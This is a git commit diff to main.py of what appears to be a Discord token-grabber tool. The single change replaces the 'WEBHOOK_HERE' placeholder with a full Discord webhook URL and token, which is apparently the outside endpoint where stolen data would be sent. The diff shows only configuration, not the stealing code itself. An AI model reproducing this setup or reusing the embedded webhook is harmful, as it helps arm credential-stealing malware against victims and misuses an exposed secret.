98ce2e55c7fc626120df8998b7fab1042b65f54f
remorseful2 <104743967+remorseful2@users.noreply.github.com>
2022-06-18 19:39:19 -0400

    Update main.py

--- main.py
+++ main.py
@@ -26,7 +26,7 @@ __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/978079721000669216/iREjKX3612O1NFW7ajRO4BVm0h43zzCrFVfxKydCncTpMT9oAxI1wVmEGqb8BsSXxYBD",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
